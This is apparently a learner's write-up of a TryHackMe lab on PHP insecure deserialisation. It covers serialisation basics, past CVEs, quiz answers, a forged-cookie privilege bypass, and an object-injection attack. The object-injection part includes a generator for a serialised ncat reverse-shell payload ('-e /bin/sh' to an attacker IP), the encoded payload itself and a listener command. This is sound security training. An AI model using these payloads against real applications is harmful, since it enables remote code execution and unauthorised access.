# Insecure Deserialisation

Room: [Insecure Deserialisation](https://tryhackme.com/room/insecuredeserialisation)

Module Prerequisite: [OWASP Top 10 (2025)](https://tryhackme.com/module/owasp-top-10-2025)

<img width="943" height="206" alt="image" src="https://github.com/user-attachments/assets/ac450169-ba85-40a9-8859-0398647d22af" />

## Introduction

User-supplied input has consistently been a catalyst for vulnerabilities, posing persistent threats across numerous platforms and applications. Exploiting user input, from SQL injection to cross-site scripting, is a well-known challenge in securing web applications. Another less understood but equally dangerous vulnerability associated with user input is insecure deserialisation. 

Insecure deserialisation exploits occur when an application trusts serialised data enough to use it without validating its authenticity. 

Serialized data is data that has been converted from a complex in-memory format (such as an object, array, or data structure in programming) into a standardized, flat format—like a string of text or a stream of bytes—so that it can be easily stored or transmitted.

This trust can lead to disastrous outcomes as attackers manipulate serialised objects to achieve remote code execution, escalate privileges, or launch denial-of-service attacks. This type of vulnerability is prevalent in applications that serialise and deserialise complex data structures across various programming environments, such as Java, .NET, and PHP, which often use serialisation for remote procedure calls, session management, and more.

---

### Connecting to the Machine

You can start the lab machine by clicking the `Start Lab Machine` button attached in this task. We use a vulnerable application later in the room to practically perform the exercise and become familiar with various attack vectors.

I am using my Kali Linux Machine as an Attack Machine and connecting to TryHackMe Server by OpenVPN.

You can check the [OpenVPN](https://tryhackme.com/room/openvpn) room to see how to connect through your machine.

OpenVPN Command: `sudo openvpn <FILENAME>`

## Some Important Concepts

### Serialisation

Think of serialisation, like packing your school bag in the morning. You have books, notebooks, a lunchbox, and a water bottle, which you need to organise into your bag. Serialisation is just like taking different pieces of information (like notes) and putting them together to make them easy to store or send to a friend. 

In programming, serialisation is the process of transforming an object's state into a human-readable or binary format (or a mix of both) that can be stored or transmitted and reconstructed as and when required. This capability is essential in applications where data must be transferred between different parts of a system or across a network, such as in web-based applications. In PHP, this process is performed using the `serialize()` function.

**Example**

```
<?php
$noteArray = array("title" => "My THM Note", "content" => "Welcome to THM!");
$serialisedNote = serialize($noteArray);  // Converting the note into a storable format
file_put_contents('note.txt', $serialisedNote);  // Saving the serialised note to a file
?>
```

The following output shows the serialised string in the `note.txt` file, which includes details of the note's structure and content. It’s stored in a way that can be easily saved or transmitted.

Serialised Note: `a:2:{s:5:"title";s:12:"My THM Note";s:7:"content";s:12:"Welcome to THM!";}`

---

### Deserialisation

Imagine you arrive at school and need everything you packed this morning. Deserialisation is like unpacking your school bag when you get to class; you take out each item so you can use it throughout the day. As you unpack your bag to get your books and lunch, deserialisation takes the packed-up data and turns it back into something you can use. Deserialisation is the process of converting the formatted data back into an object. It's crucial for retrieving data from files, databases, or across networks, restoring it to its original state for usage in applications.

Following our previous example, here's how you might deserialise the note data in PHP:

```
<?php
$serialisedNote = file_get_contents('note.txt');  // Reading the serialised note from the file
$noteArray = unserialize($serialisedNote);  // Converting the serialised string back into a PHP array
echo "Title: " . $noteArray['title'] . "<br>";
echo "Content: " . $noteArray['content'];
?>
```

This code reads the serialised note from a file and converts it back into an array, effectively reconstructing the original note. 

Discussing serialisation also necessitates a conversation about security. Like you wouldn’t want someone tampering with your school bag, insecure deserialisation can lead to significant security vulnerabilities in software applications. Attackers might alter serialised objects to execute unauthorised actions or steal data.

---

### Specific Incidents Involving Serialisation Vulnerabilities

Let's discuss specific incidents where serialisation vulnerabilities played a critical role in cyber security breaches or attacks, highlighting the importance of secure serialisation practices. These examples illustrate how attackers exploit serialisation flaws to achieve remote code execution, data leakage, and more.

**Log4j Vulnerability CVE-2021-44228**

- **Incident**: The [Log4j vulnerability](https://nvd.nist.gov/vuln/detail/cve-2021-44228), or Log4Shell, is a critical security flaw found in the Apache Log4j 2 library, a widely used logging library in Java applications. The vulnerability allows remote attackers to execute arbitrary code on affected systems by exploiting the library's insecure deserialisation functionality.
- **Impact**: The vulnerability facilitated remote code execution, enabling attackers to execute arbitrary commands on affected systems. This allowed attackers to compromise critical infrastructure, leading to unauthorised access to sensitive data, service disruptions, and potential supply chain attacks.

**WebLogic Server Remote Code Execution CVE-2015-4852**
- **Incident**: This vulnerability was related to how the [Oracle WebLogic Server](https://www.oracle.com/security-alerts/alert-cve-2015-4852.html) deserialised data was sent to the T3 protocol. Attackers could send maliciously crafted objects to the server, which, when deserialised, led to remote code execution.
- **Impact**: This vulnerability was widely exploited to gain unauthorised access to systems, deploy ransomware, or steal data. It affected all versions of the WebLogic Server that had not disabled the vulnerable service or patched the issue.

The T3 protocol is Oracle WebLogic Server's proprietary, high-performance transport layer used to transmit data between WebLogic Server instances and other Java programs, including external Java clients.

**Jenkins Java Deserialisation CVE-2016-0792**
- **Incident**: [Jenkins](https://www.tenable.com/plugins/nessus/89034), a popular automation server used in software development, experienced a critical vulnerability involving Java deserialisation. Attackers could send crafted serialisation payloads to the Jenkins CLI, which, when deserialised, could allow arbitrary code execution.
- **Impact**: This allowed attackers to execute shell commands, potentially taking over the Jenkins server, which often has broad access to a software development environment, including source code, build systems, and potentially deployment environments.

---

### Answer the questions below

1. What is the function used in PHP for serialisation?

`serialize()`

2. What is the base score for the vulnerability CVE-2015-4852?

7.5

3. Does serialisation allow only saving to a byte stream file? (yea/nay)

nay

## Serialisation Formats

While different programming languages may use varying keywords and functions for serialisation, the underlying principle remainsdifferent serialisation methods in different languages consistent. As we know, serialisation is the process of converting an object's state into a format that can be easily stored or transmitted and then reconstructed later. Whether Java, Python, .NET, or PHP, each language implements serialisation to accommodate specific features or security measures inherent to its environment. 

Unlike other common vulnerabilities that exploit the immediate processing of user inputs, insecure deserialisation problems involve a deeper interaction with the application’s core logic, often manipulating the fundamental behaviour of its components.

Now, let's explore how serialisation is explicitly handled in different languages, exploring its functionality, syntax, and unique features.

---

### PHP Serialisation

In PHP, serialisation is accomplished using the `serialize()` function. This function converts a PHP object or array into a byte stream representing the object's data and structure. The resulting byte stream can include various data types, such as strings, arrays, and objects, making it unique. 

To illustrate this, let's consider a notes application where users can save and retrieve their notes. We'll create a PHP class called Notes to represent each note and handle serialisation and deserialisation.

```
class Notes {
    public $Notescontent;

    public function __construct($content) {
        $this->Notescontent = $content;
    }
}
```

In our Notes application, when a user saves a note, we serialise the Notes class object using PHP's `serialize()` function. This converts the object into a string representation that can be stored in a file or database. 

Let's take a look at the following code snippet that serialises the Notes class object:

```
$note = new Notes("Welcome to THM");
$serialized_note = serialize($note);
```

## Exploitation - Update Properties

### Updating Properties of an Object

In this task, we'll explore a practical example in PHP, using a simple note-sharing application as our case study. Our note-sharing application allows users to create, save, and share notes easily. Users can input their notes into the application, which are then saved for future reference. Additionally, users can share their notes with others, facilitating collaboration and information exchange. The application also includes subscription-based features, ensuring only subscribed users can access certain functionalities such as note sharing.

You can access the website by visiting the link `http://<MACHINE_IP>/case1`.

<img width="284" height="239" alt="image" src="https://github.com/user-attachments/assets/945a1160-f4bf-4f37-bebf-a8657b5f6ba3" />

**Defining the Notes Class**

The application has a `Notes` class, representing a note in our application. This class has three private properties: `user`, `role`, and `isSubscribed`. We also have setter and getter methods to manipulate the `isSubscribed` property.

```
class Notes {

    private $user;
    private $role;
    private $isSubscribed;

    public function __construct($user, $role, $isSubscribed) {
        $this->user = $user;
        $this->role = $role;
        $this->isSubscribed = $isSubscribed;
    }

    public function setIsSubscribed($isSubscribed) {
        $this->isSubscribed = $isSubscribed;
    }

    public function getIsSubscribed() {
        return $this->isSubscribed;
 }
}
```

**Storing User Data in Cookies**

When a user visits our application for the first time, it sets a serialised cookie containing their user data. This includes their user name, role, and subscription status (`isSubscribed`). If the user is a paid member (`isSubscribed = true`), they are allowed to share notes.

<img width="602" height="108" alt="image" src="https://github.com/user-attachments/assets/fce839d7-ee06-48c0-926c-a7d42ca8dde1" />

**Exploiting the Vulnerability**

In this step, we'll illustrate how an attacker can exploit the vulnerability by modifying the serialised cookie value to gain unauthorised access to share notes.

- **Serialised cookie**: After decoding the base64-encoded cookie value, we obtain the following serialised representation of the Notes object.

You can decode the cookie from any only Base64 Decoder, I used [Base64 Decode and Encode](https://www.base64decode.org/)

`O:5:"Notes":3:{s:4:"user";s:5:"guest";s:4:"role";s:5:"guest";s:12:"isSubscribed";b:0;}`

PHP adds special characters to non-public property names to avoid confusion when different classes have properties with the same name.

Suppose we have this PHP class:

```
class User {
    public $name = "Ali";
    private $password = "123";
}
```

When PHP serializes this object, the result looks something like this: `O:4:"User":2:{s:4:"name";s:3:"Ali";s:14:"Userpassword";s:3:"123";}`

The important part is the property names:
- Public property: `name` — stored normally.
- Private property: `\0User\0password` — contains the class name User, surrounded by null bytes (`\0`).
- Protected property: `\0*\0password` — uses `*` instead of the class name.

When an object is serialised, PHP stores the object's properties and class name. This ensures that when the object is later deserialised, PHP knows which class to instantiate and how to assign the serialised data to the object's properties correctly. Let's break down the serialised note into its components:

- `O:5:"Notes":3`: This represents an object (`O`) with the class name `Notes`, which has three properties.
- `s:4:"user";s:5:"guest"`: This indicates a string (`s`) with a length of 4 characters, representing the property user with the value "guest".
- `s:4:"role";s:5:"guest"`: Similar to the previous one, it represents the property role with the value "guest".
- `s:12:"isSubscribed";b:0`: This represents a boolean (`b`) property named isSubscribed with the value of false (`0`).

---

### Exploiting the Vulnerability

In the current scenario, when the user would like to try to share the note, they get the following pop-up:

<img width="272" height="242" alt="image" src="https://github.com/user-attachments/assets/e7ea57c8-c7e9-46b5-8de7-3adcb5487652" />


The backend PHP code validates the incoming cookie, deserialises it, and then validates whether the user is subscribed. Our main task is to bypass that.

Suppose an attacker intercepts this serialised cookie value and modifies the `isSubscribed` property from false (`0`) to true (`1`). The attacker can manipulate the subscription status without legitimate authorisation by changing the boolean value in the serialised data.

So we will first change the value from `0` to `1` in the serialised cookie: `O:5:"Notes":3:{s:4:"user";s:5:"guest";s:4:"role";s:5:"guest";s:12:"isSubscribed";b:1;}`

Then encoding it into base64 format: `Tzo1OiJOb3RlcyI6Mzp7czo0OiJ1c2VyIjtzOjU6Imd1ZXN0IjtzOjQ6InJvbGUiO3M6NToiZ3Vlc3QiO3M6MTI6ImlzU3Vic2NyaWJlZCI7YjoxO30=`

You can use any base64 encode tool or online website, I used [Base64 Encode and Decode](https://www.base64encode.org/)

Then double click the cookie of website and paste your modified cookie.

<img width="379" height="68" alt="image" src="https://github.com/user-attachments/assets/7cb67973-1f4e-422b-a570-9fffb1e45c08" />

Without reloading the page, click the share button and you get the flag.

---

### Answer the questions below

1. What is the flag value after sharing a note with a valid subscription?

<img width="535" height="268" alt="image" src="https://github.com/user-attachments/assets/a011ff1f-f126-4a06-8e3b-accc2b9ac93d" />

2. What is the default role value once the user loads the notes application?

`guest`

## Exploitation - Object Injection

Object injection is a vulnerability that arises from insecure data deserialisation in web applications. It occurs when untrusted data is deserialised into an object, allowing attackers to manipulate the serialised data to execute arbitrary code, leading to serious security risks. 

In this task, we'll explore how object injection works and demonstrate its impact through a simple PHP code snippet. 

As we know, the vulnerability arises from the process of serialisation and deserialisation, which allows PHP objects to be converted into a storable format (serialisation) and reconstructed back into objects (deserialisation). While serialisation and deserialisation are useful for data storage and transmission, they can also introduce security risks if not properly implemented.

To exploit a PHP Object Injection vulnerability, the application should include a class featuring a PHP magic method (like `__wakeup` or `__sleep`) that can be exploited for malicious purposes. All classes involved in the attack should be declared before calling the `unserialize()` method (unless object autoloading is supported).

**Example**

Let's consider an index.php code snippet that shows the serialisation and deserialisation using the `serialize()` and `unserialize()` functions. The code accepts `GET` parameter `decode` or `encode` and converts the user-provided value accordingly.

```
<?php
class UserData {
    private $data;
    public function __construct($data) {
        $this->data = $data;
    }
..
require 'test.php';
if(isset($_GET['encode'])) {
    $userData = new UserData($_GET['encode']);
    $serializedData = serialize($userData);
    $base64EncodedData = base64_encode($serializedData);
    echo "Normal Data: " . $_GET['encode'] . "<br>";
    echo "Serialized Data: " . $serializedData . "<br>";
    echo "Base64 Encoded Data: " . $base64EncodedData;

} elseif(isset($_GET['decode'])) {
    $base64EncodedData = $_GET['decode'];
    $serializedData = base64_decode($base64EncodedData);
    $test = unserialize($serializedData);
    echo "Base64 Encoded Serialized Data: " . $base64EncodedData . "<br>";
    echo "Serialized Data: " . $serializedData;

...
```

<img width="785" height="139" alt="image" src="https://github.com/user-attachments/assets/5f6c625b-557f-4701-a04f-febcfc5a8f08" />

For example, if we send the input `hellothm` via the URL `http://<MACHINE_IP>/case2/?encode=hellothm`, we will get the following output:

<img width="685" height="215" alt="image" src="https://github.com/user-attachments/assets/df4c1014-eedb-406b-866a-8b4c778a1e38" />

We see that there is a base64 encoded string above `TzoxNzoiTWFsaWNpb3VzVXNlckRhdGEiOjE6e3M6NzoiY29tbWFuZCI7czozODoibmNhdCAtbnYgMTAuMTAuMTkwLjIxNyA0NDQ0IC1lIC9iaW4vc2giO30=`, we will decode this from the URL:

<img width="687" height="242" alt="image" src="https://github.com/user-attachments/assets/78bac952-d6dd-464f-b652-31f45e14313b" />

We get to know that there is a class named as `MaliciousUserData`, most probably saved as `test.php`

```
<?php
class MaliciousUserData {
public $command = 'ncat -nv ATTACK_IP 10.10.10.1 -e /bin/sh'; // call to troubleshooting server
    
    public function __wakeup() { 
    exec($this->command);
...

?>
```

In the above code, through insecure deserialisation, it's possible to manipulate the properties of an object, including altering the `command` property of the `MaliciousUserData` class in the above code. This can be achieved by crafting a specially crafted serialised string that contains the desired property values. 

For instance, if we want to modify the `command` property to execute a different command or connect to a different server, we can serialise an object with the desired property value and then inject it into the vulnerable `unserialize()` function. This way, upon deserialisation, the manipulated property value will be loaded into the object.

What stays the same: You cannot change the code or instructions inside the `__wakeup()` function itself. That function is locked into the original application code.

What you can change: You can change the data or variables (like a `command` string) that the function uses when it runs.

---

### Preparing the Payload

As discussed earlier, calling another class is a normal feature in PHP, and you can view the code of that file if the target website is using open-source code. 

The code in `index.php` blindly unserialises the input without performing any sanitisation. What is the option here? What if we modify the class `MaliciousUserData` and modify its `command` attribute such that when the `__wakeup` function is called, it will be called with the attacker-provided value?

Let's create some PHP code on our AttackBox that generates malicious serialised user data.

```
<?php
class MaliciousUserData {
public $command = 'ncat -nv ATTACK_IP 4444 -e /bin/sh';
}

$maliciousUserData = new MaliciousUserData();
$serializedData = serialize($maliciousUserData);
$base64EncodedData = base64_encode($serializedData);
echo "Base64 Encoded Serialized Data: " . $base64EncodedData;
?>
```

In the above code, the `_wakeup()` function of `MaliciousUserData` class (`test.php`) will execute a reverse shell command using Ncat to connect to the specified IP address (`ATTACK_TUN0_IP`) and port (`4444`) with the `-e` flag to execute `/bin/sh` as a shell.

Once you create the file named `index.php`, execute it through `php index.php` through the terminal. This will return a base64-encoded serialised object of the `MaliciousUserData` class.

The generated base64 encoded string would look like this: `TzoxNzoiTWFsaWNp[Redacted]`. 

<img width="790" height="27" alt="image" src="https://github.com/user-attachments/assets/ed9b9ea1-53fc-4410-b8cb-ccd2fe351f8f" />

Base64 Encoded Serialized Data: `TzoxNzoiTWFsaWNpb3VzVXNlckRhdGEiOjE6e3M6NzoiY29tbWFuZCI7czo0MDoibmNhdCAtbnYgMTkyLjE2OC4xNzYuMTc4IDQ0NDQgLWUgL2Jpbi9zaCI7fQ==`

Start the Netcat listener on port 4444 using the command `nc -nvlp 4444` on the AttackBox.

<img width="166" height="40" alt="image" src="https://github.com/user-attachments/assets/be41014c-f540-4c08-ac43-10f8b10a0055" />

Now, it's time to exploit the insecure deserialisation by decoding the shellcode by visiting the URL `http://<MACHINE_IP>/case2/?decode=[SHELLCODE]` without generating the shellcode. Paste the Encoded Serialized Data in the URL and press enter.

Once you visit the URL, the `index.php` file's deserialise function will deserialise the string and execute the `__wakeup()` function, leading to a remote shell. 

<img width="682" height="211" alt="image" src="https://github.com/user-attachments/assets/56ee2e16-e23a-47e9-b182-088324b38062" />

---

### Answer the questions below

1. What is the flag value after getting the reverse shell?

<img width="697" height="271" alt="image" src="https://github.com/user-attachments/assets/704637ab-7d86-41bc-9623-6cf0547f0874" />

2. What is the output of the whoami command after getting the shell?

`www-data`

<img width="67" height="38" alt="image" src="https://github.com/user-attachments/assets/45ca25e7-b714-4f78-ad80-e6ad71d399ec" />
























